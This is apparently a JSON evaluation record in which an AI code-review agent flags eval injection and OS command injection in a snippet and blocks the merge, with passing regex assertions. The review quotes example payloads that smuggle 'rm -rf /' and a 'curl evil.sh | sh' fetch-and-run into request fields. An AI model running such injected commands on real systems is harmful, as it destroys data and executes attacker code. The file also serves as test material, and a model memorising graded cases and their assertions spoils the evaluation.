@@ -1,0 +1,66 @@
+{
+  "agent": "code-reviewer",
+  "case_id": "eval-exec-injection",
+  "model": "sonnet",
+  "provider_models": [
+    "claude-sonnet-5"
+  ],
+  "prompt_hash": "a02cc5410b11db1a62c0d90f21c97a686eacb0bb19a0a3793c982827e634dda2",
+  "output": "**Note on process:** No git diff could be obtained (no shell/Bash tool available in this session, only Atlassian MCP tools). Reviewing the pasted snippet directly as the changeset under evidence-gate rules. GLIDE subagent delegation is not invokable in this toolset and does not apply here (this is not a Valkey GLIDE codebase) — self-gated out.\n\n## Spec alignment\nNo acceptance criteria provided — N/A.\n\n## Security\n\n**BLOCKING — CWE-95 (Eval Injection, mapped per instructions to CWE-94)**\nQuoted evidence: `const payload = eval('(' + req.body + ')');`\n`req.body` is untrusted network input concatenated into a string and executed as JavaScript. Any attacker who controls the request body can run arbitrary code in the server process, e.g. body = `1); require('child_process').execSync('rm -rf /'); ({target`.\nFix: replace with `JSON.parse(req.body)` wrapped in try/catch, and validate the resulting shape before use.\n\n**BLOCKING — CWE-78 (OS Command Injection)**\nQuoted evidence: `` exec(`deploy.sh ${payload.target}`); ``\n`payload.target` is attacker-controlled (derived from the same untrusted body) and is interpolated unsanitized into a shell command string passed to `exec`, which spawns a shell. An attacker can set `target` to `` foo; curl evil.sh | sh `` or `` $(curl evil.sh|sh) `` to execute arbitrary commands.\nFix: use `execFile`/`spawn` with an argument array (`execFile('deploy.sh', [payload.target])`) to avoid shell interpretation, and additionally allowlist/validate `payload.target` against expected values (e.g. known environment names) before use.\n\n**Important — CWE-20 (Improper Input Validation)**\nQuoted evidence: same two lines — there is no validation that `payload` is an object or that `payload.target` exists/matches an expected type before it's used to build a command. Combined with the eval/exec chain above, any malformed or hostile body reaches `exec` unchecked.\nFix: after parsing, explicitly validate `typeof payload.target === 'string'` and match against an allowlist/regex before invoking any process.\n\n## Correctness\nBoth lines are also functionally unsafe independent of security: `eval` will throw on non-expression bodies (unhandled exception/DoS), and there's no error handling around either the parse or the exec call.\n\n## Testability\nNo tests included in this snippet — nothing to assess.\n\n## Verdict: BLOCK\nTwo blocking security defects (CWE-95/94 eval injection, CWE-78 command injection) must be fixed before this can be merged.",
+  "assertion_results": [
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?im)(?:^|\\n)\\s*(?:(?:##\\s*)?(?:\\*\\*)?Verdict:\\s*)?(?:\\*\\*)?BLOCK(?:\\*\\*)?(?:\\b|:)"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-94"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "CWE-78|command injection"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)eval|exec"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)evidence|attack vector"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    },
+    {
+      "assertion": {
+        "type": "regex",
+        "value": "(?i)fix|replace|execFile|JSON\\.parse"
+      },
+      "passed": true,
+      "reason": "output matches regex"
+    }
+  ],
+  "status": "pass",
+  "passed": true,
+  "input_tokens": 2,
+  "output_tokens": 2543,
+  "cost_usd": 0.0708183,
+  "duration_ms": 29977
+}
